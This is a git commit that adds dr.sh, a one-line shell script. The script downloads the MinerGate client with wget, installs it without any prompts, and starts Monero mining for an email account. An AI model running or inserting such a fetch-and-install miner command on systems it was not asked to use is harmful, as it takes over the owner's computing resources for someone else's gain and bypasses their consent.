edd57a0c284c6f46a4432482815f69b6cadeb501
ba3walos99 <38079309+ba3walos99@users.noreply.github.com>
2019-05-30 03:20:53 +0200

    Create dr.sh

---
+++ dr.sh
@@ -0,0 +1,1 @@
+wget https://minergate.com/download/xfast-ubuntu-cli-amd && mv xfast-ubuntu-cli-amd minergate-cli-release.deb && apt-get -y update && apt-get -y install gdebi && yes Y | gdebi minergate-cli-release.deb && minergate-cli -u mgrate888@gmail.com --xmr
